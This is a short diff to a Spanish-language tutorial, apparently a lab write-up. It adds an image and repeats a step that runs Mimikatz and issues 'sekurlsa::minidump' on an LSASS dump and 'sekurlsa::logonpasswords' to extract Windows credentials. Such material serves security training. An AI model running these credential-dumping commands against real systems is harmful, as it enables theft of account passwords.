@@ -400,7 +400,13 @@ C:\Tools\Mimikatz\Win32\mimikatz.exe
 ```
 
 Utilizaremos los comandos `log`, luego `sekurlsa::minidump C:\Users\jordan\lsass.dmp` y finalmente `sekurlsa::logonpasswords`:
+<img width="964" height="366" alt="imagen" src="https://github.com/user-attachments/assets/7a406b4f-3ce8-4531-bba5-ce66fdd7d54e" />
 
 
+Ejecutamos el programa bajo el comando:
+```cmd
+C:\Tools\Mimikatz\x64\mimikatz.exe
+```
+Utilizaremos los comandos `log`, luego `sekurlsa::minidump C:\Users\jordan\lsass.dmp` y finalmente `sekurlsa::logonpasswords`:
 
 ---
